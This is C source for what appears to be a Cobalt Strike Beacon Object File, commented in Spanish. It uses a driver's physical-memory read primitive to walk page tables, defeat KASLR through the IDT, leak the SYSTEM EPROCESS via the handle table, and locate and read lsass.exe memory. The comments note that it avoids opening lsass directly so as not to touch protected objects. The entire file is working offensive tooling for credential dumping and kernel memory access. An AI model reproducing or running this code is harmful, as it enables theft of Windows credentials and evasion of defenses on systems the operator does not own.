#include "../include/common_bof.h"

// ============================================================
// Constantes de page table walk
// ============================================================
#define PFN_MASK        0xFFFFFFFFF000ULL
#define PAGE_PRESENT    0x1ULL
#define PAGE_LARGE      0x80ULL
#define PAGE_TRANSITION 0x800ULL

// ============================================================
// Virtual-to-Physical translation
// Page table walk: PML4 -> PDPT -> PD -> PT
// Identico al original pero con OptU64 en vez de std::optional
// ============================================================
OptU64 vtp(HANDLE h, uint64_t dtb, uint64_t va) {
    uint64_t table_base = dtb & PFN_MASK;

    // --- PML4 ---
    size_t idx = (va >> 39) & 0x1FF;
    ByteBuf e = phys_read(h, table_base + idx * 8, 8);
    if (!bb_valid(&e)) return opt_none();
    uint64_t entry = rp(e.data, 0); bb_free(&e);
    if (!(entry & PAGE_PRESENT)) return opt_none();
    table_base = entry & PFN_MASK;

    // --- PDPT (puede ser 1GB large page) ---
    idx = (va >> 30) & 0x1FF;
    e = phys_read(h, table_base + idx * 8, 8);
    if (!bb_valid(&e)) return opt_none();
    entry = rp(e.data, 0); bb_free(&e);
    if (!(entry & PAGE_PRESENT)) return opt_none();
    if (entry & PAGE_LARGE)
        return opt_some((entry & 0xFFFFC0000000ULL) | (va & ((1ULL << 30) - 1)));
    table_base = entry & PFN_MASK;

    // --- PD (puede ser 2MB large page) ---
    idx = (va >> 21) & 0x1FF;
    e = phys_read(h, table_base + idx * 8, 8);
    if (!bb_valid(&e)) return opt_none();
    entry = rp(e.data, 0); bb_free(&e);
    if (!(entry & PAGE_PRESENT)) return opt_none();
    if (entry & PAGE_LARGE)
        return opt_some((entry & 0xFFFFFFFE00000ULL) | (va & ((1ULL << 21) - 1)));
    table_base = entry & PFN_MASK;

    // --- PT (4KB page) ---
    idx = (va >> 12) & 0x1FF;
    e = phys_read(h, table_base + idx * 8, 8);
    if (!bb_valid(&e)) return opt_none();
    entry = rp(e.data, 0); bb_free(&e);

    // Pagina presente
    if (entry & PAGE_PRESENT)
        return opt_some((entry & PFN_MASK) | (va & 0xFFF));

    // Transition page (standby list, bit 11 set)
    // Comun en memoria de lsass que ha sido trimmed del working set
    if (entry & PAGE_TRANSITION) {
        static const uint64_t masks[] = {
            0xFFFFFF000ULL,
            0xFFFFFFF000ULL,
            0xFFFFFFFF000ULL,
            PFN_MASK
        };
        for (int m = 0; m < 4; m++) {
            uint64_t pa = (entry & masks[m]) | (va & 0xFFF);
            ByteBuf test = phys_read(h, pa & ~0xFFFULL, 16);
            if (bb_valid(&test)) {
                BOOL all_zero = TRUE;
                for (size_t i = 0; i < 16; i++)
                    if (test.data[i]) { all_zero = FALSE; break; }
                bb_free(&test);
                if (!all_zero) return opt_some(pa);
            }
        }
        return opt_some((entry & 0xFFFFFF000ULL) | (va & 0xFFF));
    }

    return opt_none();
}

// ============================================================
// proc_read - Lee memoria de un proceso via traduccion fisica
// Equivale a proc_read() del original
// Opera pagina a pagina para manejar cruces de pagina
// ============================================================
ByteBuf proc_read(HANDLE h, uint64_t dtb, uint64_t va, size_t size) {
    ByteBuf result = bb_alloc(size);
    if (!bb_valid(&result)) return result;

    size_t off = 0;
    while (off < size) {
        uint64_t page_off = (va + off) & 0xFFF;
        size_t chunk = 0x1000 - (size_t)page_off;
        if (chunk > size - off) chunk = size - off;

        OptU64 pa = vtp(h, dtb, va + off);
        if (!pa.valid) {
            // Pagina no mapeada - rellenar con ceros
            memset(result.data + off, 0, chunk);
        } else {
            ByteBuf data = phys_read(h, pa.val, chunk);
            if (bb_valid(&data) && data.len >= chunk) {
                memcpy(result.data + off, data.data, chunk);
            } else {
                memset(result.data + off, 0, chunk);
            }
            bb_free(&data);
        }
        off += chunk;
    }
    return result;
}

// ============================================================
// read_ptr - Lee un puntero de 8 bytes desde VA de proceso
// ============================================================
uint64_t read_ptr(HANDLE h, uint64_t dtb, uint64_t va) {
    ByteBuf d = proc_read(h, dtb, va, 8);
    uint64_t v = (bb_valid(&d) && d.len >= 8) ? rp(d.data, 0) : 0;
    bb_free(&d);
    return v;
}

// ============================================================
// KASLR defeat via SubCmd 2
// IDTR -> IDT -> ISR minimo -> scan MZ hacia atras -> ntoskrnl base
// ============================================================
typedef struct {
    uint64_t ntos_base;
    uint64_t cr3;
} KaslrInfo;

KaslrInfo kaslr_defeat(HANDLE h) {
    KaslrInfo info = {0};

    ByteBuf regs = subcmd2(h);
    if (!bb_valid(&regs) || regs.len < 448) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SubCmd 2 failed\n");
        bb_free(&regs);
        return info;
    }

    uint64_t idtr = 0, cr3 = 0;
    for (size_t i = 0; i + 15 < regs.len; i += 16) {
        char name[9] = {0};
        memcpy(name, regs.data + i, 8);
        uint64_t val = rp(regs.data, i + 8);
        if (memcmp(name, "idtr", 4) == 0) idtr = val;
        if (memcmp(name, "cr3\0", 4) == 0) cr3  = val;
    }
    bb_free(&regs);

    BeaconPrintf(CALLBACK_OUTPUT, "  idtr=%p cr3=%p\n",
                 (void*)idtr, (void*)cr3);

    if (!idtr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No IDTR in SubCmd 2\n");
        return info;
    }

    // Leer primeras 16 entradas del IDT (256 bytes)
    ByteBuf idt = virt_read(h, idtr, 256);
    if (!bb_valid(&idt)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot read IDT\n");
        bb_free(&idt);
        return info;
    }

    // Cada entrada IDT es 16 bytes, reconstruir ISR address:
    // bits[15:0]  = offset[15:0]   @ +0
    // bits[31:16] = offset[31:16]  @ +6
    // bits[63:32] = offset[63:32]  @ +8
    uint64_t min_isr = 0;
    size_t n = idt.len / 16;
    if (n > 16) n = 16;

    for (size_t i = 0; i < n; i++) {
        uint8_t* e = idt.data + i * 16;
        uint64_t isr = (uint64_t)rw(e, 0)
                     | ((uint64_t)rw(e, 6) << 16)
                     | ((uint64_t)rd(e, 8) << 32);
        if (isr > 0xFFFF000000000000ULL) {
            if (!min_isr || isr < min_isr)
                min_isr = isr;
        }
    }
    bb_free(&idt);

    if (!min_isr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No valid ISR in IDT\n");
        return info;
    }

    // Scan hacia atras buscando MZ header de ntoskrnl
    uint64_t scan = min_isr & ~0xFFFULL;
    for (uint32_t i = 0; i < 4096; i++) {
        ByteBuf page = virt_read(h, scan - i * 0x1000, 2);
        if (bb_valid(&page) && page.data[0] == 'M' && page.data[1] == 'Z') {
            info.ntos_base = scan - i * 0x1000;
            bb_free(&page);
            break;
        }
        bb_free(&page);
    }

    info.cr3 = cr3;
    return info;
}

// ============================================================
// EPROCESS discovery via SystemHandleInformation (class 16)
// Sin OpenProcess a lsass, sin tocar nada protegido
// ============================================================

// Estructura de entrada en la handle table del kernel
typedef struct {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;       // <- kernel pointer al EPROCESS
    ULONG  GrantedAccess;
} SysHandleEntry;

typedef struct {
    ULONG        NumberOfHandles;
    SysHandleEntry Handles[1];
} SysHandleInfo;

// Offsets detectados dinamicamente
typedef struct {
    uint32_t pid;
    uint32_t links;
    uint32_t name;
} EprocOffsets;

typedef struct {
    uint64_t    eprocess;   // VA del EPROCESS de lsass
    uint64_t    dtb;        // Directory Table Base (CR3 de lsass)
    uint32_t    peb_offset; // Offset de PEB en EPROCESS
    uint32_t    pid;
    EprocOffsets off;
} LsassInfo;

LsassInfo find_lsass(HANDLE h) {
    LsassInfo result = {0};

    // --- Habilitar SeDebug para ver Object pointers ---
    BOOLEAN old = FALSE;
    NTDLL$RtlAdjustPrivilege(20, TRUE, FALSE, &old);

    // --- Abrir handle a SYSTEM (PID 4) ---
    HANDLE hProc = KERNEL32$OpenProcess(
        PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 4);
    if (!hProc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess(PID 4) failed: %lu\n",
                     KERNEL32$GetLastError());
        return result;
    }

    DWORD my_pid    = KERNEL32$GetCurrentProcessId();
    USHORT my_handle = (USHORT)(uintptr_t)hProc;

    BeaconPrintf(CALLBACK_OUTPUT,
        "  Handle to SYSTEM (PID 4), our PID=%lu handle=0x%x\n",
        my_pid, my_handle);

    // --- Query SystemHandleInformation (class 16) ---
    ULONG len = 0x10000;
    SysHandleInfo* info = NULL;
    LONG status;
    ULONG out_len = 0;
    int attempts = 0;

    do {
        if (info) BOF_FREE(info);
        if (len > 0x800000) { // max 8MB
            BeaconPrintf(CALLBACK_ERROR, "[-] Handle table too large\n");
            KERNEL32$CloseHandle(hProc);
            return result;
        }
        info = (SysHandleInfo*)BOF_ALLOC(len);
        if (!info) {
            BeaconPrintf(CALLBACK_ERROR, "[-] BOF_ALLOC failed len=%lu\n", len);
            KERNEL32$CloseHandle(hProc);
            return result;
        }
        status = NTDLL$NtQuerySystemInformation(16, info, len, &out_len);
        len *= 2;
        attempts++;
    } while (status == (LONG)0xC0000004 && attempts < 16);

    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] NtQuerySystemInformation failed: 0x%lx\n", status);
        BOF_FREE(info);
        KERNEL32$CloseHandle(hProc);
        return result;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "  Handle table: %lu entries\n",
                 info->NumberOfHandles);

    // --- Buscar nuestro handle para obtener SYSTEM EPROCESS ---
    uint64_t sys_ep = 0;
    for (ULONG i = 0; i < info->NumberOfHandles; i++) {
        SysHandleEntry* e = &info->Handles[i];
        if (e->UniqueProcessId == (USHORT)my_pid &&
            e->HandleValue == my_handle) {
            sys_ep = (uint64_t)(uintptr_t)e->Object;
            BeaconPrintf(CALLBACK_OUTPUT,
                "  SYSTEM EPROCESS=%p\n", (void*)sys_ep);
            break;
        }
    }
    BOF_FREE(info);
    KERNEL32$CloseHandle(hProc);

    if (!sys_ep) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SYSTEM EPROCESS not found\n");
        return result;
    }

    // --- Detectar offsets dinamicamente leyendo SYSTEM EPROCESS ---
    ByteBuf ep_data = virt_read(h, sys_ep, 0x800);
    if (!bb_valid(&ep_data)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot read SYSTEM EPROCESS\n");
        return result;
    }

    EprocOffsets off = {0};

    // Buscar UniqueProcessId=4 seguido de kernel pointer (ActiveProcessLinks)
    for (uint32_t o = 0x100; o < 0x600; o += 8) {
        if (rp(ep_data.data, o) == 4) {
            uint64_t nxt = rp(ep_data.data, o + 8);
            if (nxt > 0xFFFF000000000000ULL) {
                off.pid   = o;
                off.links = o + 8;
                break;
            }
        }
    }

    // Buscar ImageFileName "System"
    for (uint32_t o = 0x200; o < 0x700; o++) {
        if (ep_data.data[o] == 'S' &&
            memcmp(ep_data.data + o, "System\0", 7) == 0) {
            off.name = o;
            break;
        }
    }
    bb_free(&ep_data);

    BeaconPrintf(CALLBACK_OUTPUT,
        "  Offsets: PID=0x%x Links=0x%x Name=0x%x\n",
        off.pid, off.links, off.name);

    if (!off.pid || !off.name) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot detect EPROCESS offsets\n");
        return result;
    }

    // --- Walk ActiveProcessLinks buscando lsass.exe ---
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Walking ActiveProcessLinks...\n");

    uint64_t head = sys_ep + off.links;
    ByteBuf flink_data = virt_read(h, head, 8);
    if (!bb_valid(&flink_data)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot read process list\n");
        return result;
    }

    uint64_t cur = rp(flink_data.data, 0);
    bb_free(&flink_data);

    SeenSet seen;
    seen_init(&seen);
    seen_insert(&seen, head);

    for (int i = 0; i < 500; i++) {
        if (!cur || cur < 0xFFFF000000000000ULL) break;
        if (seen_contains(&seen, cur)) break;
        seen_insert(&seen, cur);

        uint64_t ep = cur - off.links;

        // Leer nombre del proceso
        ByteBuf nm = virt_read(h, ep + off.name, 16);
        if (!bb_valid(&nm)) {
            ByteBuf nd = virt_read(h, cur, 8);
            cur = bb_valid(&nd) ? rp(nd.data, 0) : 0;
            bb_free(&nd);
            continue;
        }
        nm.data[15] = 0;

        // Comparar con "lsass.exe" (lowercase manual)
        char name[16] = {0};
        for (int j = 0; j < 15; j++) {
            char c = (char)nm.data[j];
            name[j] = (c >= 'A' && c <= 'Z') ? c + 32 : c;
        }
        bb_free(&nm);

        if (memcmp(name, "lsass.exe", 9) == 0) {
            // Obtener DTB desde EPROCESS+0x28
            ByteBuf dtb_d = virt_read(h, ep + 0x28, 8);
            uint64_t dtb = bb_valid(&dtb_d) ? rp(dtb_d.data, 0) : 0;
            bb_free(&dtb_d);

            // Obtener PID
            ByteBuf pid_d = virt_read(h, ep + off.pid, 8);
            uint32_t pid = bb_valid(&pid_d) ? (uint32_t)rp(pid_d.data, 0) : 0;
            bb_free(&pid_d);

            BeaconPrintf(CALLBACK_OUTPUT,
                "  lsass.exe PID=%lu DTB=%p\n", pid, (void*)dtb);

            // Auto-detectar offset de PEB
            ByteBuf ep2 = virt_read(h, ep, 0x800);
            if (!bb_valid(&ep2)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Cannot read lsass EPROCESS\n");
                return result;
            }

            uint32_t peb_off = 0;
            for (uint32_t poff = 0x100; poff < 0x600; poff += 8) {
                uint64_t val = rp(ep2.data, poff);
                if (val <= 0x10000 || val >= 0x7FFFFFFFFFFFULL) continue;

                ByteBuf peb = proc_read(h, dtb, val, 0x20);
                if (!bb_valid(&peb)) continue;

                BOOL all_zero = TRUE;
                for (size_t z = 0; z < peb.len; z++)
                    if (peb.data[z]) { all_zero = FALSE; break; }

                if (!all_zero) {
                    uint64_t ldr = rp(peb.data, 0x18);
                    uint64_t im  = rp(peb.data, 0x10);
                    if (ldr > 0x10000 && ldr < 0x7FFFFFFFFFFFULL &&
                        im  > 0x10000 && im  < 0x7FFFFFFFFFFFULL) {
                        peb_off = poff;
                        BeaconPrintf(CALLBACK_OUTPUT,
                            "  PEB=%p LDR=%p\n", (void*)val, (void*)ldr);
                        bb_free(&peb);
                        break;
                    }
                }
                bb_free(&peb);
            }
            bb_free(&ep2);

            result.eprocess   = ep;
            result.dtb        = dtb;
            result.peb_offset = peb_off;
            result.pid        = pid;
            result.off        = off;
            return result;
        }

        ByteBuf nd = virt_read(h, cur, 8);
        cur = bb_valid(&nd) ? rp(nd.data, 0) : 0;
        bb_free(&nd);
    }

    BeaconPrintf(CALLBACK_ERROR, "[-] lsass.exe not found in process list\n");
    return result;
}

// ============================================================
// read_ustr - Lee UNICODE_STRING desde buffer de struct
// { USHORT Length; USHORT MaxLength; PWSTR Buffer; }
// ============================================================
void read_ustr(HANDLE h, uint64_t dtb, const uint8_t* data,
               size_t off, wchar_t* out, size_t out_max) {
    out[0] = 0;
    uint16_t length = rw(data, off);
    uint64_t buf    = rp(data, off + 8);
    if (!length || !buf || length > (out_max-1)*2) return;

    ByteBuf raw = proc_read(h, dtb, buf, length);
    if (!bb_valid(&raw)) return;

    size_t chars = length / 2;
    if (chars >= out_max) chars = out_max - 1;
    memcpy(out, raw.data, chars * 2);
    out[chars] = 0;
    bb_free(&raw);
}
